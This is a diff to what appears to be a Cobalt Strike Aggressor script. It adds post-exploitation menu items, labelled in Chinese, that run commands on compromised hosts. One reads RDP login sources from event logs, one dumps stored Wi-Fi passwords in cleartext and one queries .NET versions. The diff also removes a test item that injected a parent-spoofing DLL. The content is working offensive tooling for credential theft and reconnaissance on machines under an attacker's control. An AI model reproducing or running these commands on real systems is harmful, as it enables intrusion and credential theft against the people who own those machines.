@@ -61,7 +61,18 @@ menu "扫描分析"{
         dbutton_action($dialog, "run");
         dialog_show($dialog);
     }
-    
+    item "查询管理员RDP登录来源" {
+        $bid = $1;
+        bshell($bid,"powershell -c \"get-winevent -filterhashtable \@{logname='Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational';ID=1149;} -MaxEvents 20 |ft -wrap -property TimeCreated,Message\"");
+    }
+    item "查询wifi密码"{
+        $bid = $1;
+        bshell($bid,"netsh wlan show profile * key=clear");
+    }
+    item "查询.net兼容版本"{
+        $bid = $1;
+        bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\NET Framework Setup\\NDP\" /s /v version | findstr /i version | sort /+26 /r")
+    }
     # menu "Ladon"{
     #     item "加载Ladon"{
     #         $bid = $1;
@@ -76,12 +87,4 @@ menu "扫描分析"{
     #         dialog_show($dialog);
     #     }
     # }
-    item "test"{
-        if(-is64 $1)
-        {
-            bdllspawn($1, script_resource("bin/SelectMyParent.dll"), "a and", "test dll", 5000, false);
-        } else {
-            bdllspawn($1, script_resource("bin/SelectMyParent.x64.dll"), "21588 c:\\windows\\notepad.exe", "test dll", 5000, false);
-        }
-    }
 }
